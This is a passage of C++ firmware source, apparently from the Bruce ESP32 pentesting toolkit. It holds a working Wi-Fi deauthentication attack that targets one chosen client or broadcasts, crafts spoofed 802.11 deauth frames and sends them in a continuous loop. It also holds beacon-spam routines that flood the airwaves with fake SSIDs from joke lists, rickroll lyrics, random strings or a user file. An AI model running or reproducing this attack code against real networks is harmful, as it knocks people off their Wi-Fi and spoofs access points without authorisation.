    esp_wifi_set_promiscuous_rx_cb(promisc_callback);
    esp_wifi_set_promiscuous(true);
    delay(2000);

    // ═══════ เลือก Client เป้าหมาย ═══════
    uint8_t *targetClientMac = nullptr;
    String clientName = "Broadcast";

    std::vector<String> clientNames;
    std::vector<uint8_t*> clientMacs;
    clientNames.push_back("All Clients (Broadcast)");
    clientMacs.push_back(nullptr);

    for (auto &c : g_clients) {
        if (!c.active) continue;
        char macstr[18];
        snprintf(macstr, sizeof(macstr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5]);
        String oui = getOUI(c.mac);
        String name = String(macstr);
        if (oui.length() > 0) name += " (" + oui + ")";
        clientNames.push_back(name);
        clientMacs.push_back(c.mac);
    }

    int selected = 0;
    bool chose = false;
    while (!chose) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.setTextSize(1);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setCursor(4, 10);
        tft.println("Select Client Target:");
        tft.drawLine(0, 24, tftWidth, 24, TFT_DARKGREY);

        int y = 30;
        for (int i = 0; i < clientNames.size(); i++) {
            if (i == selected) {
                tft.fillRect(4, y - 1, tftWidth - 8, 14, TFT_NAVY);
                tft.setTextColor(TFT_WHITE, TFT_NAVY);
            } else {
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            }
            tft.setCursor(10, y);
            tft.print(clientNames[i]);
            y += 16;
            if (y > tftHeight - 30) break;
        }

        if (check(NextPress)) { selected = (selected + 1) % clientNames.size(); delay(150); }
        if (check(PrevPress)) { selected = (selected - 1 + clientNames.size()) % clientNames.size(); delay(150); }
        if (check(SelPress)) { chose = true; }
        if (EscPress) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(NULL);
            wifi_atk_unsetWifi();
            returnToMenu = true;
            return;
        }
        delay(50);
    }

    targetClientMac = clientMacs[selected];
    clientName = clientNames[selected];
    bool isBroadcast = (targetClientMac == nullptr);

    // ═══════ เตรียม frame ตามโหมด ═══════
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    if (isBroadcast) {
        // โหมดดั้งเดิม: wsl_bypasser จะใส่ broadcast ให้
        wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
    } else {
        // โหมดเจาะจง: ตั้ง channel ก่อน แล้วสร้าง frame เอง
        wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
        memcpy(&deauth_frame[4], targetClientMac, 6);    // destination = client
        memcpy(&deauth_frame[10], g_targetBssid, 6);     // source = AP
        memcpy(&deauth_frame[16], g_targetBssid, 6);     // BSSID = AP
    }

    // ═══════ Layout ═══════
    const uint8_t TOP_MARGIN = 2;
    const uint8_t INFO_H = 60;
    const uint8_t CLIENT_HEADER_H = 14;
    const uint8_t ROW_H = 14;
    const uint8_t MAX_ROWS = 6;
    const uint8_t TABLE_Y = TOP_MARGIN + INFO_H + CLIENT_HEADER_H;

    uint32_t lastUIUpdate = 0;
    uint16_t count = 0;
    uint32_t totalFrames = 0;
    unsigned long startTime = millis();
    bool isPaused = true;
    bool lastSel = false;

    unsigned long lastFooterUpdate = 0;
    const unsigned long FOOTER_UPDATE_MS = 500;

    unsigned long lastCleanupTime = 0;
    const unsigned long CLEANUP_INTERVAL_MS = 5000;

    tft.fillRect(0, tftHeight - 14, tftWidth, 14, bruceConfig.bgColor);

    // ═══════ Attack loop ═══════
    while (true) {
        bool selNow = check(SelPress);
        if (selNow && !lastSel) {
            isPaused = !isPaused;
            lastUIUpdate = 0;
        }
        lastSel = selNow;
        if (EscPress) break;

        if (!isPaused) {
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                totalFrames += 3;
                if (EscPress) break;

                bool s = check(SelPress);
                if (s && !lastSel) {
                    isPaused = !isPaused;
                    lastUIUpdate = 0;
                }
                lastSel = s;
                if (isPaused) break;
            }

            // รีเฟรชช่องสัญญาณ (เลือกวิธีตามโหมด)
            static uint16_t refreshCnt = 0;
            refreshCnt += 300;
            if (refreshCnt >= 3000) {
                if (isBroadcast) {
                    // โหมด broadcast: ใช้ wsl_bypasser เหมือนเดิม
                    wsl_bypasser_send_raw_frame(&target_ap, channel, _default_target);
                } else {
                    // โหมดเจาะจง: เปลี่ยนช่องโดยไม่แตะ frame
                    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
                }
                refreshCnt = 0;
            }
        } else {
            delay(50);
        }

        if (millis() - lastCleanupTime > CLEANUP_INTERVAL_MS) {
            lastCleanupTime = millis();
            unsigned long now = millis();
            auto it = g_clients.begin();
            while (it != g_clients.end()) {
                if (!it->active && (now - it->last_seen > CLIENT_TIMEOUT)) it = g_clients.erase(it);
                else ++it;
            }
            for (auto &c : g_clients) c.active = (now - c.last_seen < CLIENT_TIMEOUT);
        }

        if (millis() - lastFooterUpdate > FOOTER_UPDATE_MS) {
            lastFooterUpdate = millis();
            tft.fillRect(0, tftHeight - 14, tftWidth, 14, bruceConfig.bgColor);
            tft.setTextSize(1);
            long remaining = 2000 - (millis() - lastUIUpdate);
            if (remaining < 0) remaining = 0;
            float sec = remaining / 1000.0;
            float progress = 1.0 - (remaining / 2000.0);

            int barX = 4, barY = tftHeight - 12, barW = 60, barH = 10, radius = 3;
            tft.fillRoundRect(barX, barY, barW, barH, radius, TFT_DARKGREY);
            int fillW = (int)(barW * progress);
            if (fillW > 0) tft.fillRoundRect(barX, barY, fillW, barH, radius, TFT_GREEN);
            tft.drawRoundRect(barX, barY, barW, barH, radius, bruceConfig.priColor);

            String footerStr = "[ESC] Stop [OK] " + String(isPaused ? "Start" : "Pause") + " " + String(sec,1) + "s";
            tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
            tft.drawString(footerStr, barX + barW + 6, barY, 1);
        }

        if (millis() - lastUIUpdate > 2000) {
            lastUIUpdate = millis();

            tft.fillRect(0, 0, tftWidth, tftHeight - 14, bruceConfig.bgColor);
            tft.drawRect(0, 0, tftWidth, tftHeight, bruceConfig.priColor);
            tft.setTextSize(1);

            int16_t leftX = 4, rightX = tftWidth / 2 + 4;
            int16_t yLeft = TOP_MARGIN + 4, yRight = TOP_MARGIN + 4;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

            String apDisplay = "AP: " + tssid;
            if (apDisplay.length() > 18) apDisplay = apDisplay.substring(0, 17) + "~";
            tft.drawString(apDisplay, leftX, yLeft, 1); yLeft += 12;

            String macDisplay = "MAC: " + mac;
            if (macDisplay.length() > 13) macDisplay = macDisplay.substring(0, 12) + "~";
            tft.drawString(macDisplay, leftX, yLeft, 1); yLeft += 12;

            tft.drawString("Ch: " + String(channel) + " (" + String(2400+channel) + "MHz)", leftX, yLeft, 1); yLeft += 12;

            int fpsValue = count / 2;
            uint16_t fpsColor = (fpsValue > 3000) ? TFT_GREEN : (fpsValue > 1000) ? TFT_YELLOW : TFT_RED;
            tft.setTextColor(fpsColor, bruceConfig.bgColor);
            tft.drawString("FPS: " + String(fpsValue), leftX, yLeft, 1);

            yRight = TOP_MARGIN + 4;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            unsigned long elapsed = (millis() - startTime) / 1000;
            char timeBuf[10]; snprintf(timeBuf, sizeof(timeBuf), "%02lu:%02lu", elapsed/60, elapsed%60);
            tft.drawString("Time: " + String(timeBuf), rightX, yRight, 1); yRight += 12;

            tft.drawString("Deauth:", rightX, yRight, 1);
            uint16_t circleX = rightX + 52, circleY = yRight + 6;
            if (!isPaused && (millis() / 500) % 2) tft.fillCircle(circleX, circleY, 3, TFT_GREEN);
            else tft.fillCircle(circleX, circleY, 3, bruceConfig.bgColor);
            tft.drawString(isPaused ? "OFF" : "ON", rightX + 60, yRight, 1);
            yRight += 12;

            String targetStr = "Tgt: " + clientName;
            if (targetStr.length() > 22) targetStr = targetStr.substring(0, 21) + "~";
            tft.drawString(targetStr, rightX, yRight, 1); yRight += 12;

            int activeCount = 0;
            for (auto &c : g_clients) if (c.active) activeCount++;
            tft.drawString("Clients: " + String(activeCount), rightX, yRight, 1); yRight += 12;
            tft.drawString("Total: " + String(totalFrames), rightX, yRight, 1);

            tft.drawFastHLine(0, TABLE_Y - 1, tftWidth, TFT_DARKGREY);

            uint8_t tableY = TABLE_Y;
            tft.fillRect(0, tableY, tftWidth, CLIENT_HEADER_H, TFT_NAVY);
            tft.setTextColor(TFT_WHITE, TFT_NAVY);
            tft.drawString("CLIENT MAC / OUI", leftX + 2, tableY + 1, 1);
            tft.drawString("SEEN", rightX + 10, tableY + 1, 1);

            tableY += CLIENT_HEADER_H;
            int shown = 0;
            for (auto &c : g_clients) {
                if (shown >= MAX_ROWS) break;
                uint16_t rowY = tableY + shown * ROW_H;
                uint16_t rowBg = (shown % 2 == 0) ? bruceConfig.bgColor : TFT_DARKGREY;
                tft.fillRect(0, rowY, tftWidth, ROW_H, rowBg);

                char macShort[10];
                snprintf(macShort, sizeof(macShort), "%02X:%02X:%02X", c.mac[0], c.mac[1], c.mac[2]);
                String oui = getOUI(c.mac);
                String clientLine = String(macShort);
                if (oui.length() > 0) clientLine += " " + oui;
                if (clientLine.length() > 18) clientLine = clientLine.substring(0, 17) + "~";

                tft.setTextColor(TFT_WHITE, rowBg);
                tft.drawString(clientLine, leftX + 4, rowY + 1, 1);
                tft.setTextColor(TFT_YELLOW, rowBg);
                tft.drawString(String((millis() - c.last_seen) / 1000) + "s", rightX + 12, rowY + 1, 1);
                shown++;
            }

            count = 0;
        }
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    wifi_atk_unsetWifi();
    returnToMenu = true;
}

void generateRandomWiFiMac(uint8_t *mac) {
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7;
    for (int i = 0; i < len; ++i) { randomName[i] = charset[rand() % strlen(charset)]; }
    randomName[len] = '\0';
    return randomName;
}

char emptySSID[32];
const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                "Abraham Linksys\n"
                                "Benjamin FrankLAN\n"
                                "Martin Router King\n"
                                "John Wilkes Bluetooth\n"
                                "Pretty Fly for a Wi-Fi\n"
#ifndef LITE_VERSION
                                "Bill Wi the Science Fi\n"
                                "I Believe Wi Can Fi\n"
                                "Tell My Wi-Fi Love Her\n"
                                "No More Mister Wi-Fi\n"
                                "LAN Solo\n"
                                "The LAN Before Time\n"
                                "Silence of the LANs\n"
                                "House LANister\n"
                                "Winternet Is Coming\n"
                                "Ping's Landing\n"
                                "The Ping in the North\n"
                                "This LAN Is My LAN\n"
                                "Get Off My LAN\n"
                                "The Promised LAN\n"
                                "The LAN Down Under\n"
                                "FBI Surveillance Van 4\n"
                                "Area 51 Test Site\n"
                                "Drive-By Wi-Fi\n"
                                "Planet Express\n"
                                "Wu Tang LAN\n"
                                "Darude LANstorm\n"
                                "Never Gonna Give You Up\n"
                                "Hide Yo Kids, Hide Yo Wi-Fi\n"
                                "Loading…\n"
                                "Searching…\n"
                                "VIRUS.EXE\n"
                                "Virus-Infected Wi-Fi\n"
                                "Starbucks Wi-Fi\n"
#endif
                                "Text 64ALL for Password\n"
                                "Yell BRUCE for Password\n"
                                "The Password Is 1234\n"
                                "Free Public Wi-Fi\n"
                                "No Free Wi-Fi Here\n"
                                "Get Your Own Damn Wi-Fi\n"
                                "It Hurts When IP\n"
                                "Dora the Internet Explorer\n"
                                "404 Wi-Fi Unavailable\n"
                                "Porque-Fi\n"
                                "Titanic Syncing\n"
                                "Test Wi-Fi Please Ignore\n"
                                "Drop It Like It's Hotspot\n"
                                "Life in the Fast LAN\n"
                                "The Creep Next Door\n"
                                "Ye Olde Internet\n"};

const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                      "02 Never gonna let you down\n"
                                      "03 Never gonna run around\n"
                                      "04 and desert you\n"
                                      "05 Never gonna make you cry\n"
                                      "06 Never gonna say goodbye\n"
                                      "07 Never gonna tell a lie\n"
                                      "08 and hurt you\n"};

void beaconSpamList(const char list[]) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int i = 0;
    int ssidsLen = strlen_P(list);

    // go to the next channel
    nextChannel();

    while (i < ssidsLen) {
        // Read next SSID from PROGMEM up to newline
        char ssidBuf[32];
        int j = 0;
        char tmp;
        // read chars from PROGMEM until newline
        do {
            tmp = pgm_read_byte(list + i + j);
            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
            j++;
        } while (tmp != '\n' && i + j < ssidsLen);

        uint8_t ssidLen = (j > 32) ? 32 : j - 1;

        // generate MAC and prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);

        // send 2 packets instead of 3 (makes devices show more networks)
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        // move cursor past the SSID and newline
        i += j;
        if (EscPress) break;
    }
}

void beaconSpamSingle(String baseSSID) {
    uint8_t beaconPacket[BEACON_PKT_LEN];
    uint8_t macAddr[6];
    int counter = 1;

    // initial channel rotation
    nextChannel();

    while (true) {
        // Create SSID with suffix (within 32 limit)
        String currentSSID = baseSSID + String(counter);
        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
        uint8_t ssidLen = currentSSID.length();

        // prepare packet
        generateRandomWiFiMac(macAddr);
        prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);

        // send 2 packets
        for (int k = 0; k < 2; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, BEACON_PKT_LEN, 0);
            vTaskDelay(1 / portTICK_PERIOD_MS);
        }

        counter++;
        if (counter > 9999) {
            counter = 1;
            nextChannel(); // change channel after resetting the counter
        }
        if (EscPress) break;
    }
}

void beaconAttack() {
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    int BeaconMode;
    String txt = "";
    String singleSSID = "";
    // create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    // for random generator
    randomSeed(1);
    options = {
        {"Funny SSID",
         [&]() {
             BeaconMode = 0;
             txt = "Spamming Funny";
         }                        },
        {"Ricky Roll",
         [&]() {
             BeaconMode = 1;
             txt = "Spamming Ricky";
         }                        },
        {"Random SSID",
         [&]() {
             BeaconMode = 2;
             txt = "Spamming Random";
         }                        },
#if !defined(LITE_VERSION)
        {"Single SSID",
         [&]() {
             BeaconMode = 4;
             txt = "Spamming Single";
         }                        },
        {"Custom SSIDs", [&]() {
             BeaconMode = 3;
             txt = "Spamming Custom";
         }},
#endif
    };
    addOptionToMainMenu();
    loopOptions(options);

    wifiConnected = true;
    String beaconFile = "";
    File file;
    FS *fs;
#if !defined(LITE_VERSION)
    // Get user input for single SSID mode
    if (BeaconMode == 4) {
        singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
        if (singleSSID.length() == 0 || singleSSID == "\x1B") { return; }
    }
#endif
    if (BeaconMode != 3) {
        drawMainBorderWithTitle("WiFi: Beacon SPAM");
        displayTextLine(txt);
    }

    while (1) {
        if (BeaconMode == 0) {
            beaconSpamList(Beacons);
        } else if (BeaconMode == 1) {
            beaconSpamList(rickrollssids);
        } else if (BeaconMode == 2) {
            char *randoms = randomSSID();
            beaconSpamList(randoms);
        }
#if !defined(LITE_VERSION)
        else if (BeaconMode == 4) {
            beaconSpamSingle(singleSSID);
        } else if (BeaconMode == 3) {
            if (!file) {
                options = {};

                fs = nullptr;
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                addOptionToMainMenu();

                loopOptions(options);
                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
                else return;
                file = fs->open(beaconFile, FILE_READ);
                beaconFile = file.readString();
                beaconFile.replace("\r\n", "\n");
                tft.drawPixel(0, 0, 0);
                drawMainBorderWithTitle("WiFi: Beacon SPAM");
                displayTextLine(txt);
            }

            const char *randoms = beaconFile.c_str();
            beaconSpamList(randoms);
        }
#endif
        if (check(EscPress) || returnToMenu) {
            if (BeaconMode == 3) file.close();
            break;
        }
    }
    wifi_atk_unsetWifi();
}
